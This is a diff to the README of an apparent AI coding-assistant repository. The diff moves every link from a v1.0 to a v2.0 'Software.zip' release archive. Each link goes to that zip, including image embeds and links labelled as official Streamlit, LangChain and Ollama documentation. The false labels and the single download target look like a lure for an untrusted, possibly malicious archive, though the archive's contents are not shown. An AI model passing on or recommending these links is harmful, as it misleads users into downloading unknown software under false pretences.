@@ -1,6 +1,6 @@
 # 🤖🚀 Welcome to DeepSeek AI Assistant with Ollama Repository! 🌟
 
-![DeepSeek AI Assistant](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip)
+![DeepSeek AI Assistant](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip)
 
 ## Repository Name
 DeepSeek-AI-Assistant-with-Ollama
@@ -11,7 +11,7 @@ Built with Streamlit, LangChain, and Ollama. Helps with code generation, debuggi
 ## Topics
 ai, ai-assistant, ai-pair-programming, code-generation, debugging-tool, deepseek, deepseek-coder, deepseek-llm, deepseek-r1, generative-ai, generative-model, langchain, llm, ml, nlp, ollama, ollama-python, prompt-engineering, streamlit
 
-[![Download Zip](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip)](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip)
+[![Download Zip](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip)](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip)
 
 For more details, visit the provided link above. If the link doesn't work, please check the "Releases" section for alternative download options.
 
@@ -38,13 +38,13 @@ Welcome to the DeepSeek AI Assistant with Ollama repository, your one-stop solut
 We welcome contributions from the community to enhance the capabilities of the DeepSeek AI Assistant with Ollama. If you have any ideas, suggestions, or improvements to share, feel free to submit a pull request or open an issue on the repository.
 
 ### Resources
-- **Streamlit Documentation:** Visit [Streamlit Docs](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip) for detailed information on building applications with Streamlit.
-- **LangChain GitHub Repository:** Check out the [LangChain Repo](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip) for more about this advanced NLP framework.
-- **Ollama AI Engine:** Learn more about Ollama and its features on the [Official Ollama Website](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip).
+- **Streamlit Documentation:** Visit [Streamlit Docs](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip) for detailed information on building applications with Streamlit.
+- **LangChain GitHub Repository:** Check out the [LangChain Repo](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip) for more about this advanced NLP framework.
+- **Ollama AI Engine:** Learn more about Ollama and its features on the [Official Ollama Website](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip).
 
 ### Get Started
 Begin your AI-powered coding journey with DeepSeek AI Assistant with Ollama today! Download the repository, explore the features, and witness the future of AI-assisted programming.
 
 🚀 Happy Coding with DeepSeek AI Assistant! 🤖✨
 
-![Powered by AI](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v1.0/Software.zip)
+![Powered by AI](https://github.com/Bukola-Babs/DeepSeek-AI-Assistant-with-Ollama/releases/download/v2.0/Software.zip)
